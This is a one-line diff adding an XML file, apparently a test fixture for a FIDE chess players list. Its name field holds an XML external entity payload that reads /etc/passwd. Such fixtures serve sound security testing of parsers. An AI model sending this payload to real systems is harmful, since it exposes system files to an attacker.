@@ -1,0 +1,1 @@
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><playerslist><player><fideid>1</fideid><name>&xxe;</name><country>IRI</country></player></playerslist>
